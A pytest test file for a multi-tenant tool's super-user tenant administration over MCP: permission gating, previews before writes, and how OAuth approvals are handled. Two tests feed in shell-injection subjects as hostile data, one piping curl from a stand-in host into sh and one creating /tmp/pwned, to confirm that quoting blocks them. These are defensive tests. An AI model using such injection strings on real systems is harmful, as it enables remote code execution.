"""Super-user tenant administration over MCP (issue #658).

The gate is the point: a workspace that is merely privileged, or an ordinary
tenant, must be refused by every action, including the read-only ones. The
rest pins what the tool does and, as importantly, what it never does.
"""

from __future__ import annotations

import shlex
from pathlib import Path

import pytest

from wingman import mcp_server
from wingman.application import tenant_admin as admin
from wingman.infrastructure.config import (
    ENV_DATA_DIR,
    load_config,
    tenant_config_scope,
)
from wingman.infrastructure.oauth_onboarding import (
    OAuthOnboardingStore,
    onboarding_path_for,
    pending_reference,
)
from wingman.infrastructure.storage import Storage
from wingman.infrastructure.tenants import (
    Tenant,
    TenantRegistryError,
    load_registry,
)

ISSUER = "https://idp.example.com"
ACTIONS = ("list", "reserve", "revoke", "approve")


def _registry(tmp_path: Path, body: str) -> Path:
    path = tmp_path / "tenants.toml"
    path.write_text(body, encoding="utf-8")
    return path


def _tenant_dir(tmp_path: Path, slug: str) -> Path:
    data_dir = tmp_path / "tenants" / slug
    data_dir.mkdir(parents=True)
    Storage(data_dir / "wingman.db").close()
    return data_dir


@pytest.fixture
def box(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, Tenant]:
    """dhk (super user), coach (privileged only), riley (ordinary)."""
    dirs = {slug: _tenant_dir(tmp_path, slug) for slug in ("dhk", "coach", "riley")}
    registry = _registry(
        tmp_path,
        f'[[tenant]]\nslug = "dhk"\ndata_dir = "{dirs["dhk"]}"\nsuper_user = true\n\n'
        f'[[tenant]]\nslug = "coach"\ndata_dir = "{dirs["coach"]}"\nprivileged = true\n\n'
        f'[[tenant]]\nslug = "riley"\ndata_dir = "{dirs["riley"]}"\n',
    )
    identities = tmp_path / "oauth-identities.toml"
    identities.write_text("", encoding="utf-8")
    monkeypatch.setattr(mcp_server, "_OAUTH_IDENTITY_PATH", identities)
    monkeypatch.setattr(
        "wingman.infrastructure.tenants.tenant_registry_path", lambda home=None: registry
    )
    return {tenant.slug: tenant for tenant in load_registry(registry)}


def _store(tmp_path: Path) -> OAuthOnboardingStore:
    return OAuthOnboardingStore(onboarding_path_for(tmp_path / "oauth-identities.toml"))


def _call(tenant: Tenant, **kwargs: object) -> str:
    with tenant_config_scope(tenant.config()):
        return mcp_server.tenant_admin(**kwargs)  # type: ignore[arg-type]


# --- the registry flag -------------------------------------------------


def test_super_user_is_false_unless_the_entry_says_so(box: dict[str, Tenant]) -> None:
    assert box["dhk"].super_user is True
    assert box["coach"].super_user is False and box["coach"].privileged is True
    assert box["riley"].super_user is False
    assert box["dhk"].config().super_user is True
    assert box["riley"].config().super_user is False


def test_super_user_is_refused_in_defaults_and_at_the_top_level(tmp_path: Path) -> None:
    for body in ("[defaults]\nsuper_user = true\n", "super_user = true\n"):
        with pytest.raises(TenantRegistryError, match="super_user"):
            load_registry(_registry(tmp_path, body))


def test_super_user_must_be_a_bare_boolean(tmp_path: Path) -> None:
    body = '[[tenant]]\nslug = "a"\ndata_dir = "/x"\nsuper_user = "true"\n'
    with pytest.raises(TenantRegistryError, match="super_user"):
        load_registry(_registry(tmp_path, body))


def test_a_solo_install_is_its_own_super_user(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv(ENV_DATA_DIR, str(tmp_path / "solo"))
    assert load_config().super_user is True


# --- the gate ----------------------------------------------------------


@pytest.mark.parametrize("who", ["coach", "riley"])
@pytest.mark.parametrize("action", ACTIONS)
def test_everyone_but_a_super_user_is_refused_by_every_action(
    box: dict[str, Tenant], tmp_path: Path, who: str, action: str
) -> None:
    result = _call(box[who], action=action, slug="newcomer", ref="AAAA-AAAA", confirmed=True)
    assert "isn't available in this workspace" in result
    assert "Nothing was changed" in result
    # No file, flag or path leaks into a refusal a tenant can read.
    assert "super_user" not in result and "tenants.toml" not in result
    assert _store(tmp_path).invites() == []


def test_a_super_user_is_not_refused(box: dict[str, Tenant]) -> None:
    assert "isn't available" not in _call(box["dhk"], action="list")


def test_a_process_without_oauth_says_so_and_changes_nothing(
    box: dict[str, Tenant], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(mcp_server, "_OAUTH_IDENTITY_PATH", None)
    result = _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    assert "not started with OAuth" in result


# --- reserve / revoke --------------------------------------------------


def test_reserve_previews_first_and_writes_only_when_confirmed(
    box: dict[str, Tenant], tmp_path: Path
) -> None:
    preview = _call(box["dhk"], action="reserve", slug="newcomer")
    assert preview.startswith("Preview:") and "confirmed=true" in preview
    assert _store(tmp_path).invites() == []

    done = _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    assert "Reserved invite slug 'newcomer'" in done
    assert [invite.slug for invite in _store(tmp_path).invites()] == ["newcomer"]
    assert not (tmp_path / "tenants" / "newcomer").exists()  # no workspace, no access


@pytest.mark.parametrize("slug", ["riley", "Bad Slug", "../etc", ""])
def test_reserve_refuses_taken_and_malformed_slugs_even_in_preview(
    box: dict[str, Tenant], tmp_path: Path, slug: str
) -> None:
    result = _call(box["dhk"], action="reserve", slug=slug, confirmed=True)
    assert result.startswith("Not reserved") and "Nothing was changed" in result
    assert _store(tmp_path).invites() == []


def test_reserving_a_slug_twice_is_refused(box: dict[str, Tenant], tmp_path: Path) -> None:
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    again = _call(box["dhk"], action="reserve", slug="newcomer")
    assert "already reserved" in again and not again.startswith("Preview")


def test_revoke_previews_then_withdraws(box: dict[str, Tenant], tmp_path: Path) -> None:
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    assert _call(box["dhk"], action="revoke", slug="newcomer").startswith("Preview:")
    assert len(_store(tmp_path).invites()) == 1
    assert "Revoked invite 'newcomer'" in _call(
        box["dhk"], action="revoke", slug="newcomer", confirmed=True
    )
    assert _store(tmp_path).invites() == []
    assert "No reserved invite" in _call(box["dhk"], action="revoke", slug="newcomer")


# --- list --------------------------------------------------------------


def test_list_shows_references_and_never_the_subject(
    box: dict[str, Tenant], tmp_path: Path
) -> None:
    store = _store(tmp_path)
    store.record_pending(ISSUER, "user_01SECRETSUBJECT")
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    result = _call(box["dhk"], action="list")
    assert "newcomer" in result
    assert pending_reference(ISSUER, "user_01SECRETSUBJECT") in result
    assert "user_01SECRETSUBJECT" not in result


# --- approve: a command, never an action -------------------------------


def _approve(box: dict[str, Tenant], tmp_path: Path, **kwargs: object) -> str:
    return _call(box["dhk"], action="approve", **kwargs)


def test_approve_prints_the_exact_command_and_creates_nothing(
    box: dict[str, Tenant], tmp_path: Path
) -> None:
    store = _store(tmp_path)
    store.record_pending(ISSUER, "user_01ABC")
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    ref = pending_reference(ISSUER, "user_01ABC")

    result = _approve(box, tmp_path, slug="newcomer", ref=ref)

    assert "sudo wingman tenant oauth-approve newcomer" in result
    assert f"--issuer {ISSUER}" in result and "--subject user_01ABC" in result
    assert f"--data-root {tmp_path / 'tenants'}" in result  # all tenants share one parent
    assert "was not run from here" in result
    # The registry, the workspace and the invite are all exactly as they were.
    assert [tenant.slug for tenant in load_registry(tmp_path / "tenants.toml")] == [
        "dhk",
        "coach",
        "riley",
    ]
    assert not (tmp_path / "tenants" / "newcomer").exists()
    assert [invite.slug for invite in store.invites()] == ["newcomer"]


def test_a_hostile_subject_cannot_break_out_of_the_printed_command(
    box: dict[str, Tenant], tmp_path: Path
) -> None:
    """Anybody on the internet can cause a pending row to exist, so what the
    token says is data, and the operator pastes this line into a root shell."""
    hostile = "x'; curl evil.example | sh; echo '"
    _store(tmp_path).record_pending(ISSUER, hostile)
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)

    result = _approve(box, tmp_path, slug="newcomer", ref=pending_reference(ISSUER, hostile))

    command = next(line for line in result.splitlines() if line.startswith("sudo "))
    words = shlex.split(command)
    assert words[words.index("--subject") + 1] == hostile
    assert "evil.example" not in [word for word in words if word != hostile]


def test_approve_refuses_an_unreserved_slug_and_an_unknown_ref(
    box: dict[str, Tenant], tmp_path: Path
) -> None:
    _store(tmp_path).record_pending(ISSUER, "user_01ABC")
    ref = pending_reference(ISSUER, "user_01ABC")
    assert "not a reserved invite" in _approve(box, tmp_path, slug="newcomer", ref=ref)
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    refused = _approve(box, tmp_path, slug="newcomer", ref="ZZZZ-ZZZZ")
    assert "No command produced" in refused and "sudo" not in refused


def test_the_tool_never_writes_the_registry(box: dict[str, Tenant], tmp_path: Path) -> None:
    before = (tmp_path / "tenants.toml").read_bytes()
    _store(tmp_path).record_pending(ISSUER, "user_01ABC")
    for action, extra in (
        ("reserve", {"slug": "newcomer", "confirmed": True}),
        ("approve", {"slug": "newcomer", "ref": pending_reference(ISSUER, "user_01ABC")}),
        ("revoke", {"slug": "newcomer", "confirmed": True}),
        ("list", {}),
    ):
        _call(box["dhk"], action=action, **extra)
    assert (tmp_path / "tenants.toml").read_bytes() == before


def test_the_admin_module_never_writes_the_registry_itself() -> None:
    """The registry is root-owned on purpose. This module may only reach it
    through an injected `register` step (the root helper); importing the
    in-process writer would be the first step toward loosening RFC-047's tier,
    and should arrive as its own decision."""
    source = Path(admin.__file__).read_text(encoding="utf-8")
    assert "_register_unprivileged_tenant" not in source
    assert "prepare_email_invites" not in source
    assert source.count("approve_pending_tenant(") == 1
    assert "register=register," in source


def test_the_gate_has_one_call_site_for_the_tool() -> None:
    source = Path(mcp_server.__file__).read_text(encoding="utf-8")
    assert source.count('super_user_refusal(config, "tenant_admin")') == 1


# --- approve from chat, through the root helper (RFC-086) ----------------


@pytest.fixture
def helper_box(
    box: dict[str, Tenant], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> dict[str, object]:
    """The same box with the registration helper 'installed': its registration
    step runs the real helper script's logic against the temp registry."""
    import importlib.util
    import os
    import pwd

    from wingman.infrastructure import register_helper

    script = Path(__file__).parents[2] / "scripts" / "wingman-register-tenant.py"
    spec = importlib.util.spec_from_file_location("register_tenant_helper_t", script)
    assert spec is not None and spec.loader is not None
    helper = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(helper)

    me = pwd.getpwuid(os.getuid()).pw_name
    registry = tmp_path / "tenants.toml"
    conf = tmp_path / "register-helper.conf"
    conf.write_text(
        f"REGISTRY={registry}\nDATA_ROOT={tmp_path / 'tenants'}\nSERVICE_USER={me}\n",
        encoding="utf-8",
    )
    conf.chmod(0o644)
    reloads: list[Path] = []
    calls: list[str] = []

    def fake_register(_registry: Path, slug: str, _data_dir: Path) -> None:
        calls.append(slug)
        try:
            helper.register(slug, str(conf), trusted_uid=os.getuid())
        except helper.Refused as exc:
            from wingman.infrastructure.oauth_onboarding import OAuthOnboardingError

            raise OAuthOnboardingError(f"the registration helper refused: {exc}") from exc

    monkeypatch.setattr(register_helper, "CONF_PATH", conf)
    monkeypatch.setattr(register_helper, "available", lambda helper=None: True)
    monkeypatch.setattr(register_helper, "register_via_helper", fake_register)
    monkeypatch.setattr(
        "wingman.infrastructure.tenant_process.signal_reload",
        lambda path, **_kw: reloads.append(path) or None,
    )
    monkeypatch.setattr(mcp_server, "_OAUTH_TRUSTED_ISSUERS", (ISSUER,))
    return {"calls": calls, "reloads": reloads, "registry": registry}


def _waiting(tmp_path: Path, subject: str = "user_01ABC", slug: str = "newcomer") -> str:
    store = _store(tmp_path)
    store.record_pending(ISSUER, subject)
    return pending_reference(ISSUER, subject)


def test_approve_from_chat_previews_before_it_admits_anyone(
    box: dict[str, Tenant], helper_box: dict[str, object], tmp_path: Path
) -> None:
    ref = _waiting(tmp_path)
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    before = (tmp_path / "tenants.toml").read_bytes()

    result = _call(box["dhk"], action="approve", slug="newcomer", ref=ref)

    assert result.startswith("Preview:") and "confirmed=true" in result
    assert "not privileged, not funded" in result
    assert (tmp_path / "tenants.toml").read_bytes() == before
    assert helper_box["calls"] == [] and [i.slug for i in _store(tmp_path).invites()] == [
        "newcomer"
    ]


def test_approve_from_chat_admits_an_isolated_unprivileged_tenant(
    box: dict[str, Tenant], helper_box: dict[str, object], tmp_path: Path
) -> None:
    ref = _waiting(tmp_path)
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)

    result = _call(box["dhk"], action="approve", slug="newcomer", ref=ref, confirmed=True)

    assert result.startswith("Approved 'newcomer'") and "reconnect" in result
    tenants = {t.slug: t for t in load_registry(tmp_path / "tenants.toml")}
    assert (tenants["newcomer"].privileged, tenants["newcomer"].funded) == (False, False)
    assert tenants["newcomer"].super_user is False
    assert (tmp_path / "tenants" / "newcomer" / "wingman.db").is_file()
    assert helper_box["calls"] == ["newcomer"]
    assert helper_box["reloads"] == [tmp_path / "tenants.toml"]
    store = _store(tmp_path)
    assert store.invites() == [] and store.pending() == []
    assert "user_01ABC" in (tmp_path / "oauth-identities.toml").read_text(encoding="utf-8")


def test_a_hostile_subject_reaches_the_helper_as_nothing_at_all(
    box: dict[str, Tenant], helper_box: dict[str, object], tmp_path: Path
) -> None:
    """Only the slug ever crosses to the root side, so what a token says
    cannot become an argument, let alone a command."""
    hostile = "x'; touch /tmp/pwned; echo '"
    ref = _waiting(tmp_path, hostile)
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    _call(box["dhk"], action="approve", slug="newcomer", ref=ref, confirmed=True)
    assert helper_box["calls"] == ["newcomer"]
    assert not Path("/tmp/pwned").exists()


def test_a_helper_refusal_grants_nothing(
    box: dict[str, Tenant],
    helper_box: dict[str, object],
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from wingman.infrastructure import register_helper
    from wingman.infrastructure.oauth_onboarding import OAuthOnboardingError

    def refuse(*_args: object) -> None:
        raise OAuthOnboardingError("the registration helper refused: no wingman.db")

    monkeypatch.setattr(register_helper, "register_via_helper", refuse)
    ref = _waiting(tmp_path)
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    before = (tmp_path / "tenants.toml").read_bytes()

    result = _call(box["dhk"], action="approve", slug="newcomer", ref=ref, confirmed=True)

    assert result.startswith("Not approved") and "No access was granted" in result
    assert (tmp_path / "tenants.toml").read_bytes() == before
    assert "user_01ABC" not in (tmp_path / "oauth-identities.toml").read_text(encoding="utf-8")
    assert helper_box["reloads"] == []


@pytest.mark.parametrize("who", ["coach", "riley"])
def test_approve_from_chat_is_still_a_super_user_only_action(
    box: dict[str, Tenant], helper_box: dict[str, object], tmp_path: Path, who: str
) -> None:
    ref = _waiting(tmp_path)
    _store(tmp_path).reserve_invite("newcomer", existing_slugs=set())
    result = _call(box[who], action="approve", slug="newcomer", ref=ref, confirmed=True)
    assert "isn't available in this workspace" in result
    assert helper_box["calls"] == []


def test_without_the_helper_approve_falls_back_to_the_printed_command(
    box: dict[str, Tenant], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from wingman.infrastructure import register_helper

    monkeypatch.setattr(register_helper, "CONF_PATH", tmp_path / "absent.conf")
    ref = _waiting(tmp_path)
    _call(box["dhk"], action="reserve", slug="newcomer", confirmed=True)
    result = _call(box["dhk"], action="approve", slug="newcomer", ref=ref, confirmed=True)
    assert "sudo wingman tenant oauth-approve newcomer" in result
    assert "helper is not installed" in result
    assert "newcomer" not in {t.slug for t in load_registry(tmp_path / "tenants.toml")}
